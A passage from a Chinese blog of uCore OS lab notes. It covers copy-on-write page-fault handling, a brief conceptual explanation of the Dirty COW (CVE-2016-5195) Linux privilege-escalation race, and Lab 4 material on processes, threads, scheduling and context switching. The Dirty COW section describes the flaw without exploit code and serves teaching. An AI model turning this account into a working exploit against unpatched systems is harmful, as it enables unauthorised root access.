      <span class="keyword">void</span> * kva_src = page2kva(page);</span><br><span class="line">                <span class="keyword">void</span> * kva_dst = page2kva(npage);</span><br><span class="line">                <span class="built_in">memcpy</span>(kva_dst, kva_src, PGSIZE);</span><br><span class="line">                <span class="comment">// 将目标页面地址设置到PTE中</span></span><br><span class="line">                ret = page_insert(to, npage, start, perm);</span><br><span class="line">            &#125;</span><br><span class="line">            assert(ret == <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        start += PGSIZE;</span><br><span class="line">    &#125; <span class="keyword">while</span> (start != <span class="number">0</span> &amp;&amp; start &lt; end);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>当某个进程想写入一个共享内存时，由于PTE上的<code>PTE_W</code>为0，所以会触发缺页中断处理程序。此时进程需要在缺页中断处理程序中复制该页内存，并设置该页内存所对应的<code>PTE_W</code>为1。</p>
<blockquote>
<p>需要注意的是，在执行缺页中断处理程序中的内存复制操作前，需要先检查该物理页的引用次数。如果该引用次数已经为1了，则表明此时的物理页只有当前进程所使用，故可以直接设置该页内存所对应的<code>PTE_W</code>为1即可，不需要进行内存复制。</p>
</blockquote>
<p>最终实现如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">do_pgfault(struct mm_struct *mm, <span class="keyword">uint32_t</span> error_code, <span class="keyword">uintptr_t</span> addr) &#123;</span><br><span class="line">    <span class="comment">// ........</span></span><br><span class="line">   <span class="comment">// 查找当前虚拟地址所对应的页表项</span></span><br><span class="line">    <span class="keyword">if</span> ((ptep = get_pte(mm-&gt;pgdir, addr, <span class="number">1</span>)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        cprintf(<span class="string">"get_pte in do_pgfault failed\n"</span>);</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果这个页表项所对应的物理页不存在，则</span></span><br><span class="line">    <span class="keyword">if</span> (*ptep == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 分配一块物理页，并设置页表项</span></span><br><span class="line">        <span class="keyword">if</span> (pgdir_alloc_page(mm-&gt;pgdir, addr, perm) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            cprintf(<span class="string">"pgdir_alloc_page in do_pgfault failed\n"</span>);</span><br><span class="line">            <span class="keyword">goto</span> failed;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        struct Page *page=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="comment">// 如果当前页错误的原因是写入了只读页面</span></span><br><span class="line">        <span class="keyword">if</span> (*ptep &amp; PTE_P) &#123;</span><br><span class="line">            <span class="comment">// 写时复制：复制一块内存给当前进程</span></span><br><span class="line">            cprintf(<span class="string">"\n\nCOW: ptep 0x%x, pte 0x%x\n"</span>,ptep, *ptep);</span><br><span class="line">            <span class="comment">// 原先所使用的只读物理页</span></span><br><span class="line">            page = pte2page(*ptep);</span><br><span class="line">            <span class="comment">// 如果该物理页面被多个进程引用</span></span><br><span class="line">            <span class="keyword">if</span>(page_ref(page) &gt; <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 释放当前PTE的引用并分配一个新物理页</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">Page</span>* <span class="title">newPage</span> = <span class="title">pgdir_alloc_page</span>(<span class="title">mm</span>-&gt;<span class="title">pgdir</span>, <span class="title">addr</span>, <span class="title">perm</span>);</span></span><br><span class="line">                <span class="keyword">void</span> * kva_src = page2kva(page);</span><br><span class="line">                <span class="keyword">void</span> * kva_dst = page2kva(newPage);</span><br><span class="line">                <span class="comment">// 拷贝数据</span></span><br><span class="line">                <span class="built_in">memcpy</span>(kva_dst, kva_src, PGSIZE);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果该物理页面只被当前进程所引用,即page_ref等1</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="comment">// 则可以直接执行page_insert，保留当前物理页并重设其PTE权限。</span></span><br><span class="line">                page_insert(mm-&gt;pgdir, page, addr, perm);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 如果swap已经初始化完成</span></span><br><span class="line">            <span class="keyword">if</span>(swap_init_ok) &#123;</span><br><span class="line">                <span class="comment">// 将目标数据加载到某块新的物理页中。</span></span><br><span class="line">                <span class="comment">// 该物理页可能是尚未分配的物理页，也可能是从别的已分配物理页中取的</span></span><br><span class="line">                <span class="keyword">if</span> ((ret = swap_in(mm, addr, &amp;page)) != <span class="number">0</span>) &#123;</span><br><span class="line">                    cprintf(<span class="string">"swap_in in do_pgfault failed\n"</span>);</span><br><span class="line">                    <span class="keyword">goto</span> failed;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 将该物理页与对应的虚拟地址关联，同时设置页表。</span></span><br><span class="line">                page_insert(mm-&gt;pgdir, page, addr, perm);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                cprintf(<span class="string">"no swap_init_ok but ptep is %x, failed\n"</span>,*ptep);</span><br><span class="line">                <span class="keyword">goto</span> failed;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 当前缺失的页已经加载回内存中，所以设置当前页为可swap。</span></span><br><span class="line">        swap_map_swappable(mm, addr, page, <span class="number">1</span>);</span><br><span class="line">        page-&gt;pra_vaddr = addr;</span><br><span class="line">   &#125;</span><br><span class="line">   ret = <span class="number">0</span>;</span><br><span class="line">failed:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>这个COW的实现效果相当不错，很好的通过了<code>make grade</code>测试。</p>
</li>
</ul>
<h4 id="3-脏牛本地提权漏洞分析">3. 脏牛本地提权漏洞分析</h4>
<blockquote>
<p>该漏洞笔者只会简单概括一下，会忽略大部分细节。更多细节请移步<a href="https://github.com/qy7tt/blog/blob/master/20161124-%E8%A7%A3%E8%AF%BBCVE-2016-5195-Dirty-COW-Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E.md" target="_blank" rel="noopener">解读CVE-2016-5195(Dirty COW)Linux本地提权漏洞</a></p>
</blockquote>
<ul>
<li>
<p>先给出漏洞函数的代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">long</span> __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages,</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags, struct page **pages,</span><br><span class="line">        struct vm_area_struct **vmas, <span class="keyword">int</span> *nonblocking)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ....</span></span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">retry:</span><br><span class="line">        <span class="comment">// 注意这里的进程调度</span></span><br><span class="line">        cond_resched();</span><br><span class="line">        <span class="comment">// ......</span></span><br><span class="line">        <span class="comment">/* 查找虚拟地址的page */</span></span><br><span class="line">        page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);</span><br><span class="line">        <span class="keyword">if</span> (!page) &#123;</span><br><span class="line">            <span class="comment">/* 如果page找不到，则进行处理 */</span></span><br><span class="line">            ret = faultin_page(tsk, vma, start, &amp;foll_flags, nonblocking);</span><br><span class="line">            <span class="keyword">switch</span> (ret) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">goto</span> retry;</span><br><span class="line">            <span class="comment">// ......</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (page)</span><br><span class="line">          <span class="comment">// 加入page数组</span></span><br><span class="line">    &#125; <span class="keyword">while</span> (nr_pages);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>执行<code>__get_user_pages</code>函数时，函数参数会携带一个<code>FOLL_WRITE</code>标记，用以指明当前操作是写入某个物理页。</p>
</li>
<li>
<p>在<code>follow_page_mask</code>中，程序会找出特定的物理页。但大部分情况下第一次执行该函数时无法真正将该物理页的地址返回，因为可能存在缺页或者权限不够的情况（例如写入了一个只读页）。</p>
</li>
<li>
<p>此时，变量<code>page</code>的值为<code>NULL</code>，之后会执行<code>faultin_page</code>函数对<code>follow_page_mask</code>的失败进行处理。包括但不限于分配新的页、修改页权限、页数据复制等等情况（上述说明的三种情况不一定会同时发生）。然后跳转至<code>retry</code>重新执行<code>follow_page_mask</code>。</p>
</li>
<li>
<p>经过几轮的循环后，当<code>faultin_page</code>函数再一次执行时，该函数会执行内存复制操作，以完成写时复制操作。同时  <strong><code>FOLL_WRITE</code>标记将会被抹去</strong>  ，之后<strong>跳转回<code>retry</code></strong>。</p>
<blockquote>
<p>因为COW已经执行完成，对于新的物理页无论是读还是写都没有问题，所以在下一次执行<code>follow_page_mask</code>函数时一定会返回该物理页，所以该标记已经失去了作用，可以被抹去。</p>
</blockquote>
</li>
<li>
<p>但此时需要注意的是，<code>retry</code>下的第一条语句是<code>cond_resched</code>函数，它将会执行<strong>线程调度</strong>，执行其他线程。但倘若<strong>调度到的线程将之前新创建的物理页删除</strong>，则一旦重新调度回当前线程后，执行<code>follow_page_mask</code>返回的是<strong>之前的只读页</strong>。</p>
<blockquote>
<p>为什么第一次执行<code>follow_page_mask</code>时返回NULL，而这一次执行返回的是只读页呢？</p>
<p>因为第一次执行时有<code>FOLL_WRITE</code>标记，权限不够，所以会返回NULL。而这次的执行由于不存在<code>FOLL_WRITE</code>标记，所以该操作会被认定为读取而不是写入，因此直接返回之前的<strong>只读物理页</strong>的地址。</p>
</blockquote>
</li>
<li>
<p>之后该<strong>只读</strong>页被添加到page数组，并在接下来的操作中被<strong>成功修改</strong>。这就是脏牛漏洞的大致原理。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>天问之路</category>
      </categories>
      <tags>
        <tag>uCore</tag>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>uCore实验 - Lab4</title>
    <url>/2020/08/uCore-4/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<ul>
<li>这里是笔者在完成<code>uCore</code> Lab 4时写下的一些笔记</li>
<li>内容涉及进程/线程管理等</li>
<li>内容较多，建议使用右侧导航栏。</li>
</ul>
<a id="more"></a>
<h2 id="知识点">知识点</h2>
<h3 id="1-进程">1. 进程</h3>
<h4 id="1-概念">1) 概念</h4>
<ul>
<li>
<p>进程是指一个具有一定<strong>独立功能</strong>的程序在一个<strong>数据集合</strong>上的一次<strong>动态执行</strong>过程，其中包括正在运行的一个程序的<strong>所有状态信息</strong>。</p>
</li>
<li>
<p>进程是程序的执行，有核心态/用户态，是一个状态变化的过程</p>
</li>
<li>
<p>进程的组成包括程序、数据块和<strong>进程控制块PCB</strong>。</p>
</li>
</ul>
<h4 id="2-进程控制块">2) 进程控制块</h4>
<blockquote>
<p>进程控制块，Process Control Block, PCB。</p>
</blockquote>
<ul>
<li>进程控制块是<strong>操作系统管理控制进程运行所用的信息集合</strong>。操作系统用PCB来描述<strong>进程的基本情况以及运行变化的过程</strong>。</li>
<li><strong>PCB是进程存在的唯一标志</strong> ，每个进程都在操作系统中有一个对应的PCB。</li>
<li>进程控制块可以通过某个数据结构组织起来（例如链表）。同一状态进程的PCB连接成一个链表，多个状态对应多个不同的链表。各状态的进程形成不同的链表：就绪联链表，阻塞链表等等。</li>
</ul>
<h4 id="3-进程状态">3) 进程状态</h4>
<p>进程的生命周期通常有6种情况：<strong>进程创建、进程执行、进程等待、进程抢占、进程唤醒、进程结束</strong>。</p>
<blockquote>
<p>部分周期没有在图中标注。</p>
</blockquote>
<p><img src="/2020/08/uCore-4/processStatus.png" alt="img"></p>
<ul>
<li>
<p>引起进程创建的情况：</p>
<ul>
<li>系统初始化，创建idle进程。</li>
<li>用户或正在运行的进程请求创建新进程。</li>
</ul>
</li>
<li>
<p>进程等待（阻塞）的情况：</p>
<ul>
<li>进程请求并等待某个系统服务，无法马上完成。</li>
<li>启动某种操作，无法马上完成。</li>
<li>需要的数据没有到达。</li>
</ul>
<blockquote>
<p>只有该进程本身才能让自己进入休眠，但只有外部（例如操作系统）才能将该休眠的进程唤醒。</p>
</blockquote>
</li>
<li>
<p>引起进程被抢占的情况</p>
<ul>
<li>高优先级进程就绪</li>
<li>进程执行当前时间用完（时间片耗尽）</li>
</ul>
</li>
<li>
<p>唤醒进程的情况：</p>
<ul>
<li>被阻塞进程需要的资源可被满足。</li>
<li>被阻塞进程等待的事件到达。</li>
</ul>
<blockquote>
<p>进程只能被别的进程或操作系统唤醒。</p>
</blockquote>
</li>
<li>
<p>进程结束的情况</p>
<ul>
<li>正常或异常退出（自愿）</li>
<li>致命错误（强制性，例如SIGSEV）</li>
<li>被其他进程所<code>kill</code>（强制）</li>
</ul>
</li>
</ul>
<h4 id="4-进程挂起">4) 进程挂起</h4>
<blockquote>
<p>将处于挂起状态的进程映像在磁盘上，目的是减少进程占用的内存。</p>
</blockquote>
<p>其模型图如下</p>
<p><img src="/2020/08/uCore-4/suspendProcessStatus.png" alt="img"><br>
以下是状态切换的简单介绍</p>
<ul>
<li>等待挂起（Blocked-suspend）： 进程在外存并等待某事件的出现。</li>
<li>就绪挂起（Ready-suspend）：进程在外存，但只要进入内存，即可运行。</li>
<li>挂起（Suspend）：把一个进程从内存转到外存。
<ul>
<li>等待到等待挂起：没有进程处于就绪状态或就绪进程要求更多内存资源。</li>
<li>就绪到就绪挂起：当有高优先级进程处于等待状态（系统认为很快会就绪的），低优先级就绪进程会挂起，为高优先级进程提供更大的内存空间。</li>
<li>运行到就绪挂起：当有高优先级等待进程因事件出现而进入就绪挂起。</li>
<li>等待挂起到就绪挂起：当有等待挂起进程因相关事件出现而转换状态。</li>
</ul>
</li>
<li>激活（Activate）：把一个进程从外存转到内存
<ul>
<li>就绪挂起到就绪：没有就绪进程或挂起就绪进程优先级高于就绪进程。</li>
<li>等待挂起到等待：当一个进程释放足够内存，并有高优先级等待挂起进程。</li>
</ul>
</li>
</ul>
<h3 id="2-线程">2. 线程</h3>
<h4 id="1-概念-2">1) 概念</h4>
<p>线程是进程的一部分，描述指令流执行状态，是进程中的指令执行流最小单位，是CPU调度的基本单位。</p>
<blockquote>
<p>进程的资源分配角色：进程由一组相关资源构成，包括地址空间、打开的文件等各种资源。</p>
<p>线程的处理机调度角色：线程描述在进程资源环境中指令流执行状态。</p>
</blockquote>
<h4 id="2-优缺点">2) 优缺点</h4>
<ul>
<li>优点：
<ul>
<li>一个进程中可以存在多个线程</li>
<li>各个线程可以并发执行</li>
<li>各个线程之间可以共享地址空间和文件等资源。</li>
</ul>
</li>
<li>缺点：
<ul>
<li>一个线程崩溃，会导致其所属的进程的所有线程崩溃。</li>
</ul>
</li>
</ul>
<h4 id="3-用户线程与内核线程">3) 用户线程与内核线程</h4>
<p>线程有三种实现方式</p>
<ul>
<li>用户线程：在用户空间实现。(POSIX Pthread)</li>
<li>内核线程：在内核中实现。(Windows, Linux)</li>
<li>轻权<strong>进程</strong>：在内核中实现，支持用户线程。</li>
</ul>
<h5 id="a-用户线程">a. 用户线程</h5>
<blockquote>
<p>用户线程是由一组用户级的线程库函数来完成线程的管理，包括线程的创建、终止、同步和调度等。</p>
</blockquote>
<ul>
<li>用户线程的特征
<ul>
<li>不依赖于操作系统内核，在用户空间实现线程机制。
<ul>
<li>可用于不支持线程的多进程操作系统。</li>
<li>线程控制模块（TCB）由线程库函数内部维护。</li>
</ul>
</li>
<li>同一个进程内的用户线程切换速度块，无需用户态/核心态切换。</li>
<li>允许每个进程拥有自己的线程调度算法。</li>
</ul>
</li>
<li>用户进程的缺点
<ul>
<li>线程发起系统调用而阻塞时，整个进程都会进入等待状态。</li>
<li>不支持基于线程的处理机抢占。</li>
<li>只能按进程分配CPU时间。</li>
</ul>
</li>
</ul>
<h5 id="b-内核线程">b. 内核线程</h5>
<blockquote>
<p>内核线程是由内核通过系统调用实现的线程机制，由内核完成线程的创建、终止和管理。</p>
</blockquote>
<p>内核线程的特征</p>
<ul>
<li>由内核自己维护PCB和TCB</li>
<li>线程执行系统调用而被阻塞不影响其他线程。</li>
<li>线程的创建、终止和切换消耗相对较大。</li>
<li>以线程为单位进行CPU时间分配。其中多线程进程可以获得更多的CPU时间。</li>
</ul>
<h5 id="c-轻权进程">c. 轻权进程</h5>
<blockquote>
<p>用户线程可以自定义调度算法，但存在部分缺点。而内核线程不存在用户线程的各种缺点。</p>
<p>所以轻权进程是用户线程与内核线程的结合产物。</p>
</blockquote>
<ul>
<li>
<p>内核支持的用户线程。一个进程可包含一个或多个轻权进程，每个轻权进程由一个单独的内核线程来支持。</p>
</li>
<li>
<p>过于复杂以至于优点没有体现出来，最后演化为单一的内核线程支持。以下是其模型图：</p>
<p><img src="/2020/08/uCore-4/LightWeightProcess.png" alt="img"></p>
</li>
</ul>
<h3 id="3-线程与进程的比较">3. 线程与进程的比较</h3>
<ul>
<li>进程是资源分配单元，而线程是CPU调度单位。</li>
<li>进程拥有一个完整的资源平台，而线程只独享指令流执行的必要资源，例如寄存器与栈。</li>
<li>线程具有就绪、等待和运行三种基本状态和状态间的转换关系。</li>
<li>线程能减小并发执行的事件和空闲开销。
<ul>
<li>线程的创建时间和终止时间比进程短。</li>
<li>同一进程内的线程切换时间比进程短。</li>
<li>由于同一进程的各线程间共享内存和文件资源，可不通过内核进行直接通信。</li>
</ul>
</li>
</ul>
<h3 id="4-进程控制">4. 进程控制</h3>
<h4 id="1-进程切换">1) 进程切换</h4>
<h5 id="a-过程">a. 过程</h5>
<ul>
<li>暂停当前进程，保存上下文，并从运行状态变成其他状态。</li>
<li>最后调度另一个进程，恢复其上下文并从就绪状态转为运行状态。</li>
</ul>
<blockquote>
<p>进程切换的要求：<strong>速度要快</strong>。</p>
</blockquote>
<h5 id="b-进程控制块PCB">b. 进程控制块PCB</h5>
<blockquote>
<p>进程切换涉及到<strong>进程控制块PCB结构</strong>.</p>
</blockquote>
<ul>
<li>
<p>内核为每个进程维护了对应的进程控制块（PCB）</p>
</li>
<li>
<p>内核将相同状态的进程的PCB放置在同一队列里。</p>
</li>
<li>
<p>其中，uCore中PCB结构如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> proc_state &#123;</span><br><span class="line">    PROC_UNINIT = <span class="number">0</span>,  <span class="comment">// 未初始化的     -- alloc_proc</span></span><br><span class="line">    PROC_SLEEPING,    <span class="comment">// 等待状态       -- try_free_pages, do_wait, do_sleep</span></span><br><span class="line">    PROC_RUNNABLE,    <span class="comment">// 就绪/运行状态   -- proc_init, wakeup_proc,</span></span><br><span class="line">    PROC_ZOMBIE,      <span class="comment">// 僵死状态       -- do_exit</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">context</span> &#123;</span>  <span class="comment">// 保存的上下文寄存器，注意没有eax寄存器和段寄存器</span></span><br><span class="line">    <span class="keyword">uint32_t</span> eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> esp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ebx;</span><br><span class="line">    <span class="keyword">uint32_t</span> ecx;</span><br><span class="line">    <span class="keyword">uint32_t</span> edx;</span><br><span class="line">    <span class="keyword">uint32_t</span> esi;</span><br><span class="line">    <span class="keyword">uint32_t</span> edi;</span><br><span class="line">    <span class="keyword">uint32_t</span> ebp;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">enum</span> proc_state state;          <span class="comment">// 当前进程的状态</span></span><br><span class="line">    <span class="keyword">int</span> pid;                        <span class="comment">// 进程ID</span></span><br><span class="line">    <span class="keyword">int</span> runs;                       <span class="comment">// 当前进程被调度的次数</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> kstack;               <span class="comment">// 内核栈</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">bool</span> need_resched;     <span class="comment">// 是否需要被调度</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">parent</span>;</span>     <span class="comment">// 父进程ID</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span>           <span class="comment">// 当前进程所管理的虚拟内存页，包括其所属的页目录项PDT</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>         <span class="comment">// 保存的上下文</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">tf</span>;</span>           <span class="comment">// 中断所保存的上下文</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> cr3;                  <span class="comment">// 页目录表的地址</span></span><br><span class="line">    <span class="keyword">uint32_t</span> flags;                 <span class="comment">// 当前进程的相关标志</span></span><br><span class="line">    <span class="keyword">char</span> name[PROC_NAME_LEN + <span class="number">1</span>];   <span class="comment">// 进程名称（可执行文件名）</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> list_link;         <span class="comment">// 用于连接list</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> hash_link;         <span class="comment">// 用于连接hash list</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>由于进程数量可能较大，倘若从头向后遍历查找符合某个状态的PCB，则效率会十分低下，因此使用了哈希表作为遍历所用的数据结构。</p>
</li>
</ul>
<h5 id="c-切换流程">c. 切换流程</h5>
<ul>
<li>
<p>uCore中，内核的第一个进程<code>idleproc</code>会执行<code>cpu_idle</code>函数，并从中调用<code>schedule</code>函数，准备开始调度进程。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cpu_idle</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> (current-&gt;need_resched)</span><br><span class="line">            schedule();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>schedule</code>函数会先清除调度标志，并从当前进程在链表中的位置开始，遍历进程控制块，直到找出处于<strong>就绪状态</strong>的进程。</p>
<p>之后执行<code>proc_run</code>函数，将环境切换至该进程的上下文并继续执行。</p>
<blockquote>
<p>需要注意的是，这个进程调度过程中不能被CPU中断给打断，原因是这可能造成条件竞争。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">schedule(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    <span class="keyword">list_entry_t</span> *le, *last;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">next</span> = <span class="title">NULL</span>;</span></span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        current-&gt;need_resched = <span class="number">0</span>;</span><br><span class="line">        last = (current == idleproc) ? &amp;proc_list : &amp;(current-&gt;list_link);</span><br><span class="line">        le = last;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ((le = list_next(le)) != &amp;proc_list) &#123;</span><br><span class="line">                next = le2proc(le, list_link);</span><br><span class="line">                <span class="keyword">if</span> (next-&gt;state == PROC_RUNNABLE)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (le != last);</span><br><span class="line">        <span class="keyword">if</span> (next == <span class="literal">NULL</span> || next-&gt;state != PROC_RUNNABLE)</span><br><span class="line">            next = idleproc;</span><br><span class="line">        next-&gt;runs ++;</span><br><span class="line">        <span class="keyword">if</span> (next != current)</span><br><span class="line">            proc_run(next);</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>proc_run</code>函数会设置TSS中ring0的内核栈地址，同时还会加载页目录表的地址。等到这些前置操作完成后，最后执行上下文切换。</p>
<blockquote>
<p>同样，设置内核栈地址与加载页目录项等这类关键操作不能被中断给打断。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">proc_run</span><span class="params">(struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (proc != current) &#123;</span><br><span class="line">        <span class="keyword">bool</span> intr_flag;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">prev</span> = <span class="title">current</span>, *<span class="title">next</span> = <span class="title">proc</span>;</span></span><br><span class="line">        local_intr_save(intr_flag);</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 设置当前执行的进程</span></span><br><span class="line">            current = proc;</span><br><span class="line">            <span class="comment">// 设置ring0的内核栈地址</span></span><br><span class="line">            load_esp0(next-&gt;kstack + KSTACKSIZE);</span><br><span class="line">            <span class="comment">// 加载页目录表</span></span><br><span class="line">            lcr3(next-&gt;cr3);</span><br><span class="line">            <span class="comment">// 切换上下文</span></span><br><span class="line">            switch_to(&amp;(prev-&gt;context), &amp;(next-&gt;context));</span><br><span class="line">        &#125;</span><br><span class="line">        local_intr_restore(intr_flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>切换上下文的操作基本上都是直接与寄存器打交道，所以<code>switch_to</code>函数使用汇编代码编写，详细信息以注释的形式写入代码中。</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="meta">.text</span></span><br><span class="line">.globl <span class="keyword">switch_to</span></span><br><span class="line"><span class="keyword">switch_to: </span>                     <span class="comment"># switch_to(from, to)</span></span><br><span class="line">    <span class="comment"># save from's registers</span></span><br><span class="line">    movl <span class="number">4</span>(%esp), %eax          <span class="comment"># 获取当前进程的context结构地址</span></span><br><span class="line">    popl <span class="number">0</span>(%eax)                <span class="comment"># 将eip保存至当前进程的context结构</span></span><br><span class="line">    movl %esp, <span class="number">4</span>(%eax)          <span class="comment"># 将esp保存至当前进程的context结构</span></span><br><span class="line">    movl %ebx, <span class="number">8</span>(%eax)          <span class="comment"># 将ebx保存至当前进程的context结构</span></span><br><span class="line">    movl %ecx, <span class="number">12</span>(%eax)         <span class="comment"># 将ecx保存至当前进程的context结构</span></span><br><span class="line">    movl %edx, <span class="number">16</span>(%eax)         <span class="comment"># 将edx保存至当前进程的context结构</span></span><br><span class="line">    movl %esi, <span class="number">20</span>(%eax)         <span class="comment"># 将esi保存至当前进程的context结构</span></span><br><span class="line">    movl %edi, <span class="number">24</span>(%eax)         <span class="comment"># 将edi保存至当前进程的context结构</span></span><br><span class="line">    movl %ebp, <span class="number">28</span>(%eax)         <span class="comment"># 将ebp保存至当前进程的context结构</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># restore to's registers</span></span><br><span class="line">    movl <span class="number">4</span>(%esp), %eax          <span class="comment"># 获取下一个进程的context结构地址</span></span><br><span class="line">                                <span class="comment"># 需要注意的是，其地址不是8(%esp)，因为之前已经pop过一次栈。</span></span><br><span class="line">    movl <span class="number">28</span>(%eax), %ebp         <span class="comment"># 恢复ebp至下一个进程的context结构</span></span><br><span class="line">    movl <span class="number">24</span>(%eax), %edi         <span class="comment"># 恢复edi至下一个进程的context结构</span></span><br><span class="line">    movl <span class="number">20</span>(%eax), %esi         <span class="comment"># 恢复esi至下一个进程的context结构</span></span><br><span class="line">    movl <span class="number">16</span>(%eax), %edx         <span class="comment"># 恢复edx至下一个进程的context结构</span></span><br><span class="line">    movl <span class="number">12</span>(%eax), %ecx         <span class="comment"># 恢复ecx至下一个进程的context结构</span></span><br><span class="line">    movl <span class="number">8</span>(%eax), %ebx          <span class="comment"># 恢复ebx至下一个进程的context结构</span></span><br><span class="line">    movl <span class="number">4</span>(%eax), %esp          <span class="comment"># 恢复esp至下一个进程的context结构</span></span><br><span class="line">    pushl <span class="number">0</span>(%eax)               <span class="comment"># 插入下一个进程的eip，以便于ret到下个进程的代码位置。</span></span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="2-进程创建">2) 进程创建</h4>
<ul>
<li>
<p>在Unix中，进程通过系统调用<code>fork</code>和<code>exec</code>来创建一个进程。</p>
<ul>
<li>其中，<code>fork</code>把一个进程复制成两个<strong>除PID以外完全相同</strong>的进程。</li>
<li><code>exec</code>用新进程来重写当前进程，PID没有改变。</li>
</ul>
</li>
<li>
<p><code>fork</code>创建一个继承的子进程。该子进程复制父进程的所有变量和内存，以及父进程的所有CPU寄存器（除了某个特殊寄存器，以区分是子进程还是父进程）。</p>
</li>
<li>
<p><code>fork</code>函数一次调用，返回两个值。父进程中返回子进程的PID，子进程中返回0。</p>
</li>
<li>
<p><code>fork</code>函数的<strong>开销十分昂贵</strong>，其实现开销来源于</p>
<ul>
<li>对子进程分配内存。</li>
<li>复制父进程的内存和寄存器到子进程中。</li>
</ul>
